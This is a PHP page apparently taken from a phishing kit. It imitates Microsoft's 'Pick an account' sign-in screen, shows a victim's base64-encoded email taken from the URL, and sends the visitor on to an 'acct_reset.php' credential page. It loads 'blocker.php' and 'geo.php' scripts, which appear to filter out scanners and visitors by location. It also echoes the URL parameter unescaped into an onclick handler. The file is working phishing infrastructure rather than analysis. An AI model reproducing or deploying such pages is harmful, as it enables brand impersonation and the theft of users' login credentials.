<?php
session_start();
//require 'core/functions.php';
require 'blocker.php';
include "geo.php";


//logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");

if(isset($_SESSION['email'])) {
    echo '<script>window.location = "acct_reset.php";</script>';
    exit();
}

//if(!empty($_GET['email'])) {
 //   logger("[LOGIN] {$_SERVER['REQUEST_URI']} - 200");
//}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Sign in to your account</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="/netease/assets/images/favicon.ico">
        <link rel="stylesheet" href="/netease/assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="/netease/assets/css/another.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="/netease/assets/popper.min.js"></script>
        <script src="/netease/assets/bootstrap.min.js"></script>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row d-flex align-items-center">
                <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
                    <div class="card">
                        <div class="card-body">
                            <img style="margin-top: 25px; margin-left: 20px;" src="/netease/assets/images/logo.svg">
                            <h4 class="pl-1 m-3">Pick an account</h4>
                            <ul class="list-group">
                                <li class="list-group-item" onclick="return window.location='acct_reset.php?userid=<?php echo $_GET['email']; ?>';"><img src="/netease/assets/images/user2.svg"><?php echo isset($_GET['email']) ? base64_decode($_GET['email']) : '' ?><img class="mt-3 float-right" src="/netease/assets/images/more.svg"></li>
                                <li class="list-group-item" onclick="return window.location='/netease/reset/switch.php';"><img src="/netease/assets/images/plus.svg">Use another account</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <p><img src="/netease/assets/images/ellipsis_white.svg"></p>
            <p>Privacy & cookies</p>
            <p>Terms of use</p>
            <p>©<?php echo date('Y'); ?> Microsoft</p>
        </div>
    </body>
</html>